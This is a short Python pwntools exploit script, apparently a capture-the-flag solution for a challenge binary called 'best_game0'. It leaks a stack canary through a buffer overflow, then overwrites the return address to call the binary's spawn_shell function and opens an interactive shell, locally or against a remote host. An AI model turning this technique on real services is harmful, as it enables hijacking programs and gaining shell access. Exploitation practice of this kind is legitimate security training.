#!/usr/bin/env python3
from pwn import *

EXE_FILENAME='./tbg_files/the_best_game/bg0_docker/best_game0'
HOST = args.HOST or '127.0.0.1'
PORT = int(args.PORT or 9000)
exe = context.binary = ELF(EXE_FILENAME)
# libc = exe.libc
argv = [EXE_FILENAME]
envp = {}

CANARY_OFFSET = 32
EIP_OFFSET = 48 # da ghidra il canary Ã¨ a ebp - 0xc, il return address a ebp + 4, quindi 32 + 12 + 4 = 48

def start():
	gdbscript = '''
	break *main
	continue
	'''
	if args.GDB:
		return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
	elif args.REMOTE:
		return remote(HOST, PORT)
	else:
		return process(argv=argv, env=envp)

io = start()
io.sendlineafter(b'# ', b'a'*CANARY_OFFSET)
io.recvuntil(b'aaaa\n')
canary = b'\x00' + io.recvline() [: 3]
log.info(f'canary = {u32(canary):x}')
io.sendlineafter(b'# ', (b'a'*CANARY_OFFSET + canary). ljust(EIP_OFFSET, b'a') + p32(exe.symbols.spawn_shell))
io.sendlineafter(b'# ', b'HZD')
io.interactive()